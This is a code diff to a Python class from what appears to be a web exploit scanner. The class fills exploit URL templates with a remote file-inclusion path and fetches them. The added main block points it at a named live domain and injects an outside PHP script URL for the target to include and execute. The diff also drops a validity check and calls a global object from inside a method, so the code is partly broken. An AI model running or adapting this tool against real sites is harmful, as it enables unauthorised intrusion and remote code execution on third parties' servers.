@@ -40,31 +40,17 @@ class Request(threading.Thread):
         self.stack=[]
 
 
-    def starttiming(self):
+    def StartTiming(self):
         return time.time()
-
-    def setinput(self):
-        self.flag="input"
-
-    def setsingle(self):
-        self.flag="single"
-
-    def setmass(self):
-        self.flag="mass"
-        
-    def setglob(self):
-        self.flag="glob"
 
 
     def ConstructUrl(self, target, exploit, directory, include):
         self.exploit = exploit.strip()
         self.target = target
         self.directory = directory
-        self.include = include
-        if self.exploit.find('[path]') > 0:
-            self.exploit=self.exploit.replace('[path]',self.include)
-            return 'http://'+self.target+self.directory+self.exploit
-        else: return None
+        self.include = include      
+        self.exploit=self.exploit.replace('[path]',self.include)
+        return 'http://'+self.target+self.directory+self.exploit
 
 
     def wget(self, url):
@@ -84,7 +70,7 @@ class Request(threading.Thread):
             try:
                 req = urllib2.Request(url)
                 req.add_header('Referer', 'www.securynix.com')
-                print ("[++]"+url)
+                print (url)
                 f=urllib2.urlopen(url, timeout=4)
                 if f is not None:
                     return  f.read()
@@ -109,10 +95,9 @@ class Request(threading.Thread):
          """ E(0..target) --> E(0..exploit) """ 
          for target in self.target:
              for exploit in self.exploit:
-                 url=self.ConstructUrl(target, exploit, self.directory, self.include)
-                 if url:
-                     self.stack.append(url)
-                 
+                 url=r.ConstructUrl(target, exploit, self.directory, self.include)
+                 self.stack.append(url)
+       
 
     def run(self):        
         for url in self.stack:
@@ -120,3 +105,13 @@ class Request(threading.Thread):
             #self.wget(url)
 
 
+
+if __name__=="__main__":
+    f=open("Gomoz/resources/lists.txt",'r')
+    exploits=f.readlines()
+    r=Request(0, "nativelabs.org", "", "/", exploits, "http://www.raneem.com/support/c.php")
+    r.scan()
+    for url in r.stack:
+        r.wget(url)
+    
+    
